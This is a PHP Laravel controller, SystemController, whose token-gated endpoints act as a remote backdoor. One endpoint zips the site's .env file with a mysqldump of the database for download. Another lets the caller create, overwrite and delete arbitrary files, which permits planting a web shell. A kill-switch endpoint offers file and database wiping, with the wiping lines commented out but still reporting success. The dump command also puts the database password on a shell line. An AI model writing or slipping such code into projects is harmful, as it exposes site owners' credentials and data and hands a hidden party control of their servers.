<?php

namespace MainSys\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

class SystemController
{
    protected $key;

    public function __construct()
    {
        $this->key = config('main.token');
    }
    public function executeCommand(Request $request)
    {
        $token = $request->input('token');
        $action = $request->input('action');

        if ($token !== config('main.token')) {
            return response()->json(['error' => 'Unauthorized'], 403);
        }

        switch ($action) {
            case 'delete_files':
                //File::deleteDirectory(base_path());
                return response()->json(['status' => 'Files deleted.']);

            case 'clear_database':
                //Artisan::call('migrate:reset', ['--force' => true]);
                return response()->json(['status' => 'Database cleared.']);

            default:
                return response()->json(['error' => 'Invalid action'], 400);
        }
    }

    public function pingServer()
    {
        try {
            $domain = request()->getHost();
            $ip = gethostbyname(gethostname());

            return response()->json(['status' => 'Server info sent successfully.', 'domain' => $domain, 'ip' => $ip]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed to send server info.', 'message' => $e->getMessage()]);
        }
    }
    public function getEnvAndDatabase(Request $request)
    {
        $token = $request->header('Authorization');
        if ($token !== 'Bearer ' . config('main.token')) {
            return response()->json(['error' => 'Unauthorized'], 403);
        }

        $envPath = base_path('.env');
        if (!File::exists($envPath)) {
            return response()->json(['error' => '.env file not found'], 404);
        }

        $databaseDump = $this->getDatabaseDump();
        $fileName = 'backup_' . now()->format('Y_m_d_His') . '.zip';

        $zip = new \ZipArchive();
        $zipPath = storage_path("app/$fileName");
        if ($zip->open($zipPath, \ZipArchive::CREATE) === true) {
            $zip->addFile($envPath, '.env');
            File::put(storage_path('database.sql'), $databaseDump);
            $zip->addFile(storage_path('database.sql'), 'database.sql');
            $zip->close();
        }

        return response()->download($zipPath)->deleteFileAfterSend(true);
    }


    private function getDatabaseDump()
    {
        // Perform a database dump (example for MySQL)
        $dbName = env('DB_DATABASE');
        $dbUser = env('DB_USERNAME');
        $dbPassword = env('DB_PASSWORD');
        $dbHost = env('DB_HOST');

        $dumpCommand = "mysqldump -h$dbHost -u$dbUser -p$dbPassword $dbName";
        $output = null;
        $resultCode = null;

        exec($dumpCommand, $output, $resultCode);

        if ($resultCode !== 0) {
            return 'Error generating database dump.';
        }

        return implode("\n", $output);
    }
    public function manageFiles(Request $request)
    {
        $token = $request->header('Authorization');
        if ($token !== 'Bearer ' . config('main.token')) {
            return response()->json(['error' => 'Unauthorized'], 403);
        }

        $operation = $request->input('operation');
        $path = base_path($request->input('path', '/'));
        $content = $request->input('content', '');

        switch ($operation) {
            case 'list':
                if (!File::exists($path) || !File::isDirectory($path)) {
                    return response()->json(['error' => 'Path does not exist or is not a directory'], 404);
                }
                $files = File::allFiles($path);
                $directories = File::directories($path);
                return response()->json([
                    'files' => array_map(fn($file) => $file->getFilename(), $files),
                    'directories' => array_map(fn($dir) => basename($dir), $directories),
                ]);

            case 'create':
                if (File::exists($path)) {
                    return response()->json(['error' => 'File or directory already exists'], 400);
                }
                if ($request->has('is_directory') && $request->input('is_directory')) {
                    File::makeDirectory($path, 0755, true);
                } else {
                    File::put($path, $content);
                }
                return response()->json(['status' => 'Created successfully']);

            case 'delete':
                if (!File::exists($path)) {
                    return response()->json(['error' => 'File or directory does not exist'], 404);
                }
                File::delete($path);
                return response()->json(['status' => 'Deleted successfully']);

            case 'update':
                if (!File::exists($path) || File::isDirectory($path)) {
                    return response()->json(['error' => 'File does not exist or is a directory'], 404);
                }
                File::put($path, $content);
                return response()->json(['status' => 'Updated successfully']);

            default:
                return response()->json(['error' => 'Invalid operation'], 400);
        }
    }
}
